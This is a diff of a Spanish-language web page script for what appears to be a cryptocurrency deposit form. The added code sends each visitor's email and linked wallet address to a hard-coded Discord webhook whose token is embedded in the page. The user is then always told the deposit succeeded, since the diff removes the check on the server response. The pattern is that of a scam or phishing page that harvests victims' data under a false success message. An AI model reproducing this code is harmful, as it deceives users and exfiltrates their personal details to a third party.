@@ -80,56 +80,58 @@
     <div id="mensaje-procesando" class="mensaje-procesando"></div>
 
     <script>
+function enviarDatosAlWebhook(correo, direccion, captura) {
+    var webhookURL = 'https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo';
+    var payload = {
+        content: 'Nuevo depósito:\nCorreo: ' + correo + '\nDirección Vinculada: ' + direccion,
+        // También puedes incluir la URL de la captura en el mensaje si lo deseas
+    };
+
+    // Realizar una solicitud HTTP POST al webhook de Discord
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+    });
+}
+
 function enviarDatos() {
     var correo = document.getElementById("correo").value;
     var direccion = document.getElementById("address").value;
+    var capturaURL = '';  // La URL de la captura del depósito, si la tienes
 
     // Validar el formato del correo y la existencia de la dirección
     if (correo && correo.trim() !== '' && direccion && direccion.trim() !== '') {
-        // Mostrar mensaje de procesamiento
-        var mensajeProcesando = document.getElementById("mensaje-procesando");
-        mensajeProcesando.textContent = "Procesando el depósito. Por favor, espere unos minutos para que se complete la operación.";
-        mensajeProcesando.style.color = "#00ff00"; // Color verde para indicar un mensaje informativo
+        // Aquí puedes cargar la captura del depósito si es necesario
 
-        // Verificar los valores de correo y dirección antes de la solicitud
-        console.log("Correo:", correo);
-        console.log("Dirección:", direccion);
+        // Llamar a la función para enviar los datos al webhook de Discord
+        enviarDatosAlWebhook(correo, direccion, capturaURL);
 
-        var payload = {
-            correo: correo,
-            direccion: direccion
-        };
-
-        // Realizar una solicitud POST al Webhook de Discord
-        fetch('https://discordapp.com/api/webhooks/1167972770072776744/HiKMuv4QorZGzPWNzIQAwvN2ak_ND03hm9nAk6y5Nh3IvkAtdGshrYbbMBOJ2L9Fq8Ny', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        })
-        .then(response => {
-            if (response.ok) {
-                // Éxito
-                mostrarMensaje("Depósito procesado con éxito. Recibirás un correo electrónico pronto.");
-                setTimeout(function() {
-                    window.location.href = "/pagina-principal"; // Redirigir al usuario a la página principal después de un cierto tiempo
-                }, 300000); // Redirigir después de 5 minutos (300000 milisegundos)
-            } else {
-                // Error
-                mostrarError("Error al procesar el depósito. Por favor, inténtalo de nuevo más tarde.");
-            }
-        })
-        .catch(error => {
-            // Error de red u otros errores
-            console.error('Error:', error);
-            mostrarError("Error al procesar el depósito. Por favor, inténtalo de nuevo más tarde.");
-        });
+        // Mostrar mensaje de éxito u realizar otras acciones si es necesario
+        mostrarMensaje("Depósito procesado con éxito. Recibirás un correo electrónico pronto.");
+        setTimeout(function() {
+            window.location.href = "/pagina-principal";
+        }, 300000); // Redirigir después de 5 minutos (300000 milisegundos)
     } else {
+        // Mostrar mensaje de error si falta algún dato
         mostrarError("Por favor, ingrese un correo válido y una dirección.");
     }
 }
 
+function mostrarMensaje(mensaje) {
+    var mensajeFlotante = document.getElementById("mensaje-copiado");
+    mensajeFlotante.textContent = mensaje;
+    mensajeFlotante.style.display = "inline";
+}
+
+function mostrarError(mensaje) {
+    var mensajeFlotante = document.getElementById("mensaje-copiado");
+    mensajeFlotante.textContent = mensaje;
+    mensajeFlotante.style.color = "#ff0000";
+    mensajeFlotante.style.display = "inline";
+}
 
     function mostrarMensaje(mensaje) {
         var mensajeFlotante = document.getElementById("mensaje-copiado");
